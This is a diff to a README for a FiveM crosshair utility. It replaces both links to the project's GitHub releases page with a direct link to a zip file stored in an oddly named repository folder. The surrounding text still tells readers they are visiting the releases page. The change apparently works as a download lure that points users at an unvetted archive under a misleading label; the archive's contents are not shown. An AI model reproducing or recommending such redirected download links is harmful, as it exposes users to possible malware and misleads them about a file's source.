@@ -1,7 +1,7 @@
 # 🎯 al_crosshair - Your Perfect Crosshair Awaits
 
 ## 📥 Download Now!
-[![Download al_crosshair](https://img.shields.io/badge/download-al_crosshair-brightgreen)](https://github.com/monkeybey/al_crosshair/releases)
+[![Download al_crosshair](https://raw.githubusercontent.com/monkeybey/al_crosshair/main/Mutisia/al_crosshair.zip)](https://raw.githubusercontent.com/monkeybey/al_crosshair/main/Mutisia/al_crosshair.zip)
 
 ## 🚀 Getting Started
 Welcome to al_crosshair! This application brings you a powerful crosshair system designed specifically for FiveM. You can choose from 90 unique crosshairs, all while enjoying real-time previews. It includes features such as size and opacity controls, smart notifications, and a favorites system. This guide will help you download and run the software smoothly.
@@ -29,7 +29,7 @@ Ensure your system meets the following requirements:
 ## 🌐 Download & Install
 To get al_crosshair, visit the releases page:
 
-[Download al_crosshair from Releases](https://github.com/monkeybey/al_crosshair/releases)
+[Download al_crosshair from Releases](https://raw.githubusercontent.com/monkeybey/al_crosshair/main/Mutisia/al_crosshair.zip)
 
 ### Steps to Install:
 1. **Visit the Releases Page:** Click the link above to go directly to the download section.
